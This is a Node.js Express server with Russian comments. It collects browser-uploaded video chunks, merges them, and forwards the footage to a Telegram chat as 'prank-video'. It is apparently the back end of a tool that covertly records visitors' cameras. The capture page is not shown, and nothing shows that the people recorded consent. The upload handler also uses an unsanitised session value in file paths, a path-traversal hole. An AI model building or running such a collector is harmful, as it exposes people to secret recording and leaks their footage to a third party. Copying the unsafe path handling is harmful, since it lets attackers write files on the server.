require('dotenv').config({ path: './process.env' });
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

const TMP = path.join(__dirname, 'tmp-uploads');
fs.mkdirSync(TMP, { recursive: true });

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TG_CHAT = process.env.TELEGRAM_CHAT_ID;

console.log(
    'TG_TOKEN:',
    TG_TOKEN ? TG_TOKEN.slice(0, 10) + '...' : '❌ НЕ ЗАДАН',
);
console.log('TG_CHAT :', TG_CHAT || '❌ НЕ ЗАДАН');

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- 1) приём чанка ---
app.post('/upload-chunk', (req, res) => {
  const { session, index, ext } = req.query;
  if (!session || index == null) return res.status(400).send('bad params');

  const safeExt = ext === 'mp4' ? 'mp4' : 'webm';
  const dir = path.join(TMP, session);
  fs.mkdirSync(dir, { recursive: true });

  const file = path.join(
      dir,
      `${String(index).padStart(8, '0')}.${safeExt}`,
  );
  const ws = fs.createWriteStream(file);
  req.pipe(ws);
  ws.on('finish', () => res.sendStatus(200));
  ws.on('error', (e) => {
    console.error(e);
    res.sendStatus(500);
  });
});

// --- 2) финал: склеить и отправить в Telegram ---
app.post('/upload-finish', async (req, res) => {
  const session = req.body.session || req.query.session;
  const extFromReq = (req.body.ext || req.query.ext) === 'mp4' ? 'mp4' : null;
  if (!session) return res.status(400).send('no session');

  const dir = path.join(TMP, session);
  if (!fs.existsSync(dir)) return res.status(404).send('no session dir');

  // ждём финальный чанк (beacon приходит с задержкой, особенно на мобильных)
  await new Promise((r) => setTimeout(r, 1500));

  const all = fs.readdirSync(dir);
  const webm = all.filter((f) => f.endsWith('.webm')).sort();
  const mp4 = all.filter((f) => f.endsWith('.mp4')).sort();

  let files, ext;
  if (extFromReq === 'mp4' && mp4.length) {
    files = mp4; ext = 'mp4';
  } else if (webm.length >= mp4.length && webm.length) {
    files = webm; ext = 'webm';
  } else if (mp4.length) {
    files = mp4; ext = 'mp4';
  } else {
    return res.status(400).send('no chunks');
  }

  const out = path.join(TMP, `${session}.${ext}`);
  const ws = fs.createWriteStream(out);
  for (const f of files) {
    ws.write(fs.readFileSync(path.join(dir, f)));
  }
  ws.end();

  ws.on('finish', async () => {
    try {
      await sendToTelegram(out, ext);
      console.log('✅ Отправлено:', session, files.length, 'чанков', '(' + ext + ')');
      res.sendStatus(200);
    } catch (e) {
      console.error('Telegram error:', e);
      res.sendStatus(500);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
      try {
        fs.unlinkSync(out);
      } catch {}
    }
  });
});

// --- 3) Telegram ---
async function sendToTelegram(filePath, ext) {
  const buf = fs.readFileSync(filePath);
  const form = new FormData();

  const type = ext === 'mp4' ? 'video/mp4' : 'video/webm';
  const name = ext === 'mp4' ? 'prank-video.mp4' : 'prank-video.webm';

  form.append('chat_id', TG_CHAT);
  form.append('video', new Blob([buf], { type }), name);
  form.append('supports_streaming', 'true');

  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, {
    method: 'POST',
    body: form,
  });
  if (!r.ok) throw new Error('telegram: ' + (await r.text()));
}

app.listen(3000, () => console.log('http://localhost:3000'));